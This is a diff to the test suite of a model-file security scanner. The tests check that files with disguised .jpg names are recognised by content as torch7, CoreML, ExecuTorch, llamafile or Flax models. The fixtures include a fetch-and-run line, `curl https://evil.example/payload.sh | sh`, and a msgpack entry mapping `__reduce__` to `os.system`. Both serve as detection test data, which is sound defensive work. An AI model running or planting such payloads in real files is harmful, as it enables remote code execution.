@@ -7,6 +7,7 @@ import stat
 import struct
 import tarfile
 import zipfile
+from collections.abc import Callable
 from pathlib import Path
 from unittest.mock import AsyncMock, MagicMock, patch
 
@@ -27,6 +28,7 @@ from modelaudit.utils.sources.cloud_storage import (
     redact_cloud_error_for_display,
     redact_url_for_display,
 )
+from tests.helpers import create_mock_coreml
 
 
 def make_fs_mock() -> MagicMock:
@@ -71,6 +73,21 @@ def make_zip_payload(entries: dict[str, bytes]) -> bytes:
 def make_safetensors_payload() -> bytes:
     header = json.dumps({"weight": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]}}).encode("utf-8")
     return struct.pack("<Q", len(header)) + header + b"\x00" * 4
+
+
+def make_coreml_payload(tmp_path: Path) -> bytes:
+    return create_mock_coreml(tmp_path / "model.jpg").read_bytes()
+
+
+def make_executorch_payload() -> bytes:
+    return b"\x0c\x00\x00\x00ET12" + b"\x04\x00\x04\x00\x04\x00\x00\x00"
+
+
+def make_flax_msgpack_payload() -> bytes:
+    msgpack = pytest.importorskip("msgpack")
+    payload = msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
+    assert isinstance(payload, bytes)
+    return payload
 
 
 def test_run_coroutine_sync_without_running_loop() -> None:
@@ -251,6 +268,46 @@ def test_filter_scannable_cloud_files_includes_content_routed_objects(
     assert _filter_scannable_cloud_files(files, fs=fs) == [{**files[0], "content_detected_format": expected_format}]
 
 
+@pytest.mark.parametrize(
+    ("filename", "payload_factory", "expected_format"),
+    [
+        pytest.param(
+            "torch7.jpg",
+            lambda _tmp_path: (
+                b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
+                b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
+                b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+            ),
+            "torch7",
+            id="torch7",
+        ),
+        pytest.param("coreml.jpg", make_coreml_payload, "coreml", id="coreml"),
+        pytest.param("program.jpg", lambda _tmp_path: make_executorch_payload(), "executorch", id="executorch"),
+        pytest.param(
+            "llamafile.jpg",
+            lambda _tmp_path: b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime\n",
+            "llamafile",
+            id="llamafile",
+        ),
+        pytest.param("flax.jpg", lambda _tmp_path: make_flax_msgpack_payload(), "flax_msgpack", id="flax-msgpack"),
+    ],
+)
+def test_filter_scannable_cloud_files_matches_local_skip_filter_routes(
+    tmp_path: Path,
+    filename: str,
+    payload_factory: Callable[[Path], bytes],
+    expected_format: str,
+) -> None:
+    url = f"s3://bucket/models/{filename}"
+    payload = payload_factory(tmp_path)
+    fs = make_fs_mock()
+    configure_remote_open_payloads(fs, {url: payload})
+
+    files = [{"path": url, "name": filename, "size": len(payload), "human_size": f"{len(payload)} B"}]
+
+    assert _filter_scannable_cloud_files(files, fs=fs) == [{**files[0], "content_detected_format": expected_format}]
+
+
 def test_filter_scannable_cloud_files_skips_benign_zip_content() -> None:
     url = "s3://bucket/models/document.payload"
     payload = make_zip_payload({"[Content_Types].xml": b"<Types />", "word/document.xml": b"<document />"})
@@ -287,6 +344,12 @@ def test_filter_scannable_cloud_files_skips_benign_zip_content() -> None:
             json.dumps({"nodes": [{"op": "Custom"}], "arg_nodes": [], "heads": [[0, 0, 0]]}).encode(),
             id="mxnet-near-match",
         ),
+        pytest.param(
+            "tool.jpg",
+            b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime",
+            id="generic-executable",
+        ),
+        pytest.param("program.jpg", b"\x0c\x00\x00\x00ETXX" + b"\x04\x00\x04\x00\x04\x00\x00\x00", id="executorch"),
     ],
 )
 def test_filter_scannable_cloud_files_skips_benign_content_near_matches(
